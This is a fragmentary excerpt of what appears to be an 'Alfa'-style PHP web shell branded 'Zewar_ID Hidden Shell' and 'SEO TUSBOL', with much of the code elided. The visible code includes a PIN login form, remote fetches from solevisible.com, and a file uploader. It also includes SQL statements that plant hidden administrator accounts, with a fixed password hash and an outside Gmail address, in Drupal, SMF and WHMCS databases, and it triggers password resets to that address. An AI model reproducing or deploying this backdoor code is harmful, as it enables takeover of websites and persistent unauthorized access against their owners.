...
/*
	...
	Gmail:		piramidstore08@gmail.com
  ...
  <style>
    ...
    * {
    ...
    .banner {
      ...
      align-items: center;
      flex-direction: column;
      clip-path: polygon(0 0, 100% 0, 100% 100%, 13% 100%); /* dibuat lebih lebar */
      padding: 40px 30px;
...
<body>
  ...
  <div class="wrapper">
    ...
    <form action="" method="POST" class="form">
      ...
      <div class="inp">
        <i class="fa fa-key"></i>
        <input type="password" name="password" class="input" placeholder="PIN Masuk">
      </div>
...
<title>..:: SEO TUSBOL ::..</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://a.top4top.io/p_3569tdlfw1.jpg" /></center>
...
echo '<html>';
echo "<title>Zewar_ID Hidden Shell</title>";
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://a.top4top.io/p_3569tdlfw1.jpg" /></td>
</tr>
<tr>
...
$curl = new AlfaCURL();
$content = $curl->Send("http://solevisible.com/nyet.php");
...
echo '<div class="header">';
$news = new AlfaCURL();
$about_us = $news->Send("http://solevisible.com/abot.php");
if(empty($about_us)){
...
$create = "insert into tblclients (email) values('piramidstore08@gmail.com')";
...
$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=piramidstore08@gmail.com");
...
$email = "piramidstore08@gmail.com";
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[./SEO-TUSBOL &copy; ".date('Y')." ]</span></div></td>
</tr>
</table>
</div>
...
$table = array('td1' =>
 ...
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'piramidstore08@gmail.com', 'inputSize' => '50')
);
create_table($table);
...
$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','piramidstore08@gmail.com','filtered_html','1','Europe/Berlin','piramidstore08@gmail.com')") or die(mysqli_error($conn));
...
$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','piramidstore08@gmail.com')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
